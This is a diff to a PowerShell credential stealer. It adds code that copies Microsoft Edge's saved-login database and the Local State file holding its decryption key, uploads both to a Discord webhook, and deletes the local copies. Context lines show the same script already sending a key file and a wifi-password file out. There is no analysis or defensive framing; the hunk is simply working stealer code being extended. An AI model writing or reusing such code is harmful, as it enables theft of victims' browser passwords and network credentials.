@@ -44,6 +44,17 @@ Copy-Item $sourceFile2 $outputFile2;
 Upload-Discord -file $outputFile2 -text "Key-File"; 
 Remove-Item $outputFile2
 
+$sourceEdge1="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data";
+$outputEDGE1 = "$([System.Environment]::GetFolderPath('Desktop'))\outputEDGE.txt";
+Copy-Item $sourceEdge1 $outputEDGE1;
+Upload-Discord -file $outputEDGE1 ;
+Remove-Item $outputEDGE1;
+$sourceEDGE2 = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State";
+$outputEDGE2 = "$([System.Environment]::GetFolderPath('Desktop'))\keyEDGE.txt";
+Copy-Item $sourceEDGE2 $outputEDGE2;
+Upload-Discord -file $outputEDGE2 -text "Key-File";
+Remove-Item $outputEDGE2
+
 Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
 
  
